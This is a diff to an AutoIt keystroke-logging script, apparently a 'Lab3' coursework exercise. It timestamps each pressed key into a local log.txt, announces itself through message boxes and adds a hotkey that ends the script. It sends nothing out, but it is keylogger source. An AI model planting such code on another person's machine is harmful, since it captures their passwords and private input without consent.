@@ -8,10 +8,10 @@
 
 #ce ----------------------------------------------------------------------------
 
-; Script Start - Add your code below here
+; Script Start
 
 #include <MsgBoxConstants.au3>
-#include <WinAPIFiles.au3>
+;#include <WinAPIFiles.au3>
 #include <Misc.au3>	;function from this lib is used in _IsAnyKeyPressed
 #include <Date.au3>
 
@@ -53,20 +53,25 @@ Func _IsAnyKeyPressed($UseNames=0)
 EndFunc
 
 
+HotKeySet("+!e", "Terminate")	;Shift+Alt+e
+Func Terminate()
+   FileClose($logFile)
+   MsgBox($MB_SYSTEMMODAL, "Lab3", "Script terminated ☠.")
+   Exit
+EndFunc
 
 Local Const $sFilePath = (@ScriptDir & "\log.txt")
-
 Local $iFileExists = FileExists($sFilePath)
 
 If $iFileExists Then
-   MsgBox($MB_SYSTEMMODAL, "", "The log file exists.")
+   MsgBox($MB_SYSTEMMODAL, "Lab3", "The log file exists.")
 Else
-   MsgBox($MB_SYSTEMMODAL, "", "The log file doesn't exist. It will be created automatically in the script directory." )
+   MsgBox($MB_SYSTEMMODAL, "Lab3", "The log file doesn't exist. It will be created automatically in the script directory." )
 EndIf
 
 $logFile = FileOpen(@ScriptDir & "\log.txt", $FO_APPEND)
 If $logFile = -1 Then
-   MsgBox($MB_SYSTEMMODAL, "", "An error occurred when reading the file.")
+   MsgBox($MB_SYSTEMMODAL, "Lab3", "An error occurred when reading the file.")
    Return False
 EndIf
 
@@ -82,9 +87,7 @@ While 1
 	  ;While 1
 		 $key=_IsAnyKeyPressed(1)
 		 If $key Then
-			;MsgBox($MB_SYSTEMMODAL, "Pressed key", $key)
 			$logString = _NowDate() & " " & _NowTime(3) & " Pressed key: " & $key
-			;MsgBox($MB_SYSTEMMODAL, "", $logString)
 			FileWriteLine($logFile, $logString)
 			Sleep(100)
 		 EndIf
@@ -95,12 +98,7 @@ While 1
 	  $logString = _NowDate() & " " & _NowTime(3) & " Program closed."
 	  FileWriteLine($logFile, $logString)
    EndIf
-   ;мб через HotKeySet выход из цикла
 WEnd
-
-
-
-FileClose($logFile)
 
 
 
